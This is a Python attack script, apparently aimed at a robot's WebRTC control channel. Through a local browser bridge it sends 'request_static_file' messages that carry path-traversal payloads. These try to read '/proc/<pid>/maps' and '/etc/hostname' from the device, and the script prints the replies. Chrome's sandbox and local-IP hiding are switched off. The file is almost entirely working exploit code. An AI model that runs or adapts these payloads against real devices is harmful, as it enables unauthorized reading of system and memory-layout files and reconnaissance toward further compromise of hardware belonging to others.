#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""C2 probe v2: correct rtc_inner_req envelope."""
import time, json, sys, requests
from playwright.sync_api import sync_playwright

sys.stdout.reconfigure(encoding='utf-8', errors='replace')
CHROME = r"C:\Program Files\Google\Chrome\Application\chrome.exe"
BR = "http://127.0.0.1:9999/"
BT_PID = "784"

MSGS = [
    ("valid-uslam", {"type": "rtc_inner_req", "req_type": "request_static_file",
                     "related_bussiness": "uslam_final_pcd", "req_uuid": "probe-a"}),
    ("trav-maps", {"type": "rtc_inner_req", "req_type": "request_static_file",
                   "related_bussiness": f"../../../../proc/{BT_PID}/maps", "req_uuid": "probe-b"}),
    ("trav-hostname", {"type": "rtc_inner_req", "req_type": "request_static_file",
                       "related_bussiness": "../../../../etc/hostname", "req_uuid": "probe-c"}),
    ("fp-direct", {"type": "rtc_inner_req", "req_type": "request_static_file",
                   "file_path": f"/proc/{BT_PID}/maps", "req_uuid": "probe-d"}),
    ("fp-trav", {"type": "rtc_inner_req", "req_type": "request_static_file",
                 "related_bussiness": "uslam_final_pcd", "file_path": f"../../../../proc/{BT_PID}/maps",
                 "req_uuid": "probe-e"}),
]

def main():
    with sync_playwright() as p:
        browser = p.chromium.launch(executable_path=CHROME, headless=True, args=[
            "--disable-features=WebRtcHideLocalIpsWithMdns", "--no-sandbox"])
        page = browser.new_context().new_page()
        page.goto(BR, wait_until="domcontentloaded")
        t0 = time.time(); s = {}
        while time.time() - t0 < 40:
            s = requests.get(BR + "status", timeout=3).json()
            if s.get("validated"):
                break
            time.sleep(1)
        if not s.get("validated"):
            print("[!] never validated"); browser.close(); return
        print("[+] validated", flush=True)
        page.evaluate("""() => {
          window.rawlog = [];
          dc.addEventListener('message', e => {
            try {
              let t = (typeof e.data === 'string') ? e.data : '[bin ' + e.data.byteLength + 'B]';
              if (t.includes('heartbeat') || t.includes('lowstate')) return;
              window.rawlog.push(t.slice(0, 4000));
            } catch(err) {}
          });
        }""")
        for label, msg in MSGS:
            page.evaluate("(m) => { if (dc && dc.readyState==='open') dc.send(JSON.stringify(m)); }", msg)
            time.sleep(3)
            raw = page.evaluate("() => window.rawlog.splice(0)")
            print(f"[{label}] {len(raw)} response(s)")
            for x in raw[:4]:
                print("   ", x[:600])
        browser.close()

main()

